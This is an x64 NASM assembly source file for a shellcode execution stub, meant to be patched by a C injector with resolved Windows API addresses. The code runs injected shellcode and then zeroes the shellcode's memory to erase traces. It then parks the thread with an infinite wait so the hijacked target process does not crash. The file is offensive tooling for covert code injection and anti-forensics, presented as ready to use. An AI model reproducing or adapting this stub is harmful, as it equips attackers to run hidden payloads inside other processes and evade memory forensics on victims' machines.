;-------------------------------------------------------;
;   Author  => GlenX                                    ;
;   Date    => July 9, 2026                             ;
;   Compile => nasm -f bin -O3 -o stub.bin stub.asm     ;
;-------------------------------------------------------;


[BITS 64]

; The C caller must resolve the following functions and overwrite the placeholders
; VirtualProtect
; WaitForSingleObject
; 
; In addition, the C caller must overwrite the placeholder for shellcode address and size with the actual values


fire:
    sub rsp, 20h                        ; shadow stack
    
    ; Run Shellcode
    mov rax, 1111111111111111h          ; shellcode
    call rax                            ; Invoke shellcode


    ; Change to RW - VirtualProtect
    mov rcx, 1111111111111111h          ; LPVOID lpAddress
    mov rdx, 2222222222222222h          ; SIZE_T dwSize - Note: VirtualProtect will always free a page
    mov r8, 4h                          ; 0x04 PAGE_READWRITE
    push 0                              ; Alloc space in the stack
    lea r9, [rsp]                       ; ptr to OldProtect - VirtualProtect requires a valid pointer for OldProtect otherwise it will fail
    mov rax, 3333333333333333h          ; VirtualProtect
    call rax                            ; Call VirtualProtect(shellcode, size, PAGE_READWRITE, oldProtect)


    ; Cleanup
    mov     rcx, 2222222222222222h      ; size
    mov     rax, 1111111111111111h      ; dst
    xor     edx, edx                    ; i = 0

.loop:
    cmp     rdx, rcx
    jge     .done
    mov     byte [rax + rdx], 0
    inc     rdx
    jmp     .loop

.done:

    ; If shellcode memory has been allocated with a separate call to VirtualAlloc we can also release the memory that hosted the shellcode
    ; Free Mem - VirtualFree
    ;mov rcx, 1111111111111111h          ; LPVOID lpAddress
    ;mov rdx, 2222222222222222h          ; SIZE_T dwSize - Note: VirtualFree will always free a page
    ;mov r8, 00008000h                   ; MEM_RELEASE
    ;mov rax, 5555555555555555h          ; VirtualFree
    ;call rax                            ; Call VirtualFree(shellcode, size, MEM_RELEASE)

    ; This is a very ugly workaround to not crash the target process
    ; We call WaitForSingleObject((HANDLE)-1, INFINITE) 
    ; so that the thread will never return
    mov rcx, -1
    mov rdx, 00000000FFFFFFFFh 
    mov rax, 4444444444444444h          ; WaitForSingleObject
    call rax
    add rsp, 28h                        ; Clear off the stack - This will never execute

